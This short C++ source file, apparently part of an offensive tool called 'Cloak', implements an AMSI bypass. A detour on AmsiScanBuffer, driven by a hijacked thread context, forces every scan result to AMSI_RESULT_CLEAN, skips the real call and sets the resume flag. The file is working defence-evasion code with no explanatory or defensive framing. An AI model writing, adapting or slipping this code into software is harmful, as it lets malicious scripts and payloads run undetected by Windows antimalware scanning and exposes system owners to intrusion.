#include "Cloak.hpp"

#ifdef BYPASS_AMSI
#include <amsi.h>

VOID AmsiScanBufDetour(PCONTEXT pThreadCtx) {
    AMSI_RESULT* res = ( AMSI_RESULT * ) GetFunctionArgument( pThreadCtx, 0x6 );
    *res = AMSI_RESULT_CLEAN;
    BLOCK_REAL( pThreadCtx );
    (pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16));
}
#endif // !BYPASS_AMSI